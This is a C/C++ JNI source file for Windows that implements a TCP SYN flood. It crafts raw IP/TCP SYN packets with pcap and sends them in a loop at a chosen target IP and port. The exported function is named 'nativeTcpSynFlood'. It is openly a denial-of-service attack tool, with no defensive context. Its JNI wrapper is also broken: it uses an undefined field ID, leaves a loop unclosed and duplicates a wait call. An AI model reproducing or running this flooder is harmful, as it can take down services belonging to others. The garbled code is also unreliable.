#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <pcap.h>
#include <iphlpapi.h>
#include <cstdint>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "wpcap.lib")

#define PACKET_SIZE 40

// IP header structure
struct iphdr {
    uint8_t ihl:4, version:4;
    uint8_t tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t ttl;
    uint8_t protocol;
    uint16_t check;
    uint32_t saddr;
    uint32_t daddr;
};

// TCP header structure
struct tcphdr {
    uint16_t source;
    uint16_t dest;
    uint32_t seq;
    uint32_t ack_seq;
    uint16_t res1:4, doff:4, fin:1, syn:1, rst:1, psh:1, ack:1, urg:1, ece:1, cwr:1;
    uint16_t window;
    uint16_t check;
    uint16_t urg_ptr;
};

struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t tcp_length;
    struct tcphdr tcp;
};

struct thread_data {
    const char* target_ip;
    int target_port;
    int bytes_per_second;
    volatile bool* stop_attack;
};

unsigned short in_cksum(unsigned short *addr, int len) {
    int nleft = len;
    int sum = 0;
    unsigned short *w = addr;
    unsigned short answer = 0;

    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }

    if (nleft == 1) {
        *(unsigned char *)(&answer) = *(unsigned char *)w;
        sum += answer;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return answer;
}

unsigned short tcp_checksum(struct iphdr *ip, struct tcphdr *tcp) {
    struct pseudo_header psh;
    char *pseudogram;
    int psize;

    psh.source_address = ip->saddr;
    psh.dest_address = ip->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));

    psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
    pseudogram = (char*)malloc(psize);

    memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), tcp, sizeof(struct tcphdr));

    unsigned short checksum = in_cksum((unsigned short*)pseudogram, psize);

    free(pseudogram);
    return checksum;
}

DWORD WINAPI send_syn_packets(LPVOID arg) {
    struct thread_data *data = (struct thread_data *)arg;
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    
    handle = pcap_open_live(NULL, 65536, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device: %s\n", errbuf);
        return 1;
    }

    char packet[PACKET_SIZE];
    struct iphdr *ip = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));

    // Fill in the IP header
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = htons(PACKET_SIZE);
    ip->id = htons(54321);
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_TCP;
    ip->saddr = inet_addr("192.168.1.100"); // Replace with your source IP
    ip->daddr = inet_addr(data->target_ip);

    // Fill in the TCP header
    tcp->source = htons(12345); // Replace with your source port
    tcp->dest = htons(data->target_port);
    tcp->seq = htonl(1000);
    tcp->ack_seq = 0;
    tcp->doff = 5;
    tcp->fin = 0;
    tcp->syn = 1;
    tcp->rst = 0;
    tcp->psh = 0;
    tcp->ack = 0;
    tcp->urg = 0;
    tcp->window = htons(5840);

    LARGE_INTEGER frequency, start_time, current_time;
    QueryPerformanceFrequency(&frequency);
    QueryPerformanceCounter(&start_time);

    double packets_per_second = (double)data->bytes_per_second / PACKET_SIZE;
    double interval = 1.0 / packets_per_second;

    uint32_t seq_num = 1000;
    uint16_t src_port = 12345;

    while (!*(data->stop_attack)) {
        // Update IP and TCP headers for each packet
        ip->id = htons(rand());
        tcp->source = htons(src_port++);
        tcp->seq = htonl(seq_num++);

        // Calculate IP checksum
        ip->check = 0;
        ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));

        // Calculate TCP checksum
        tcp->check = 0;
        tcp->check = tcp_checksum(ip, tcp);

        // Send the packet
        if (pcap_sendpacket(handle, (u_char*)packet, PACKET_SIZE) != 0) {
            fprintf(stderr, "Error sending the packet: %s\n", pcap_geterr(handle));
        }

        // Rate limiting
        QueryPerformanceCounter(&current_time);
        double elapsed = (double)(current_time.QuadPart - start_time.QuadPart) / frequency.QuadPart;
        if (elapsed < interval) {
            DWORD sleep_time = (DWORD)((interval - elapsed) * 1000);
            if (sleep_time > 0) {
                Sleep(sleep_time);
            }
        }
        start_time = current_time;
    }

    pcap_close(handle);
    return 0;
}

JNIEXPORT jboolean JNICALL Java_com_yourpackage_Jenkins_nativeTcpSynFlood
  (JNIEnv *env, jobject obj, jstring targetIp, jint targetPort, jlong bytesPerSecond) {
    const char *ip = env->GetStringUTFChars(targetIp, 0);
    struct thread_data data;
    data.target_ip = ip;
    data.target_port = targetPort;
    data.bytes_per_second = bytesPerSecond;
    volatile bool stop_attack = false;
    data.stop_attack = &stop_attack;
    jclass cls = env->GetObjectClass(obj);
    HANDLE thread = CreateThread(NULL, 0, send_syn_packets, (LPVOID)&data, 0, NULL);
    while (!env->GetBooleanField(obj, fid)) {
    if (thread == NULL) {
        env->ReleaseStringUTFChars(targetIp, ip);
        return JNI_FALSE;
    }
    WaitForSingleObject(thread, INFINITE);
    // Wait for the thread to finish
    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);
    env->ReleaseStringUTFChars(targetIp, ip);
    return JNI_TRUE;
}
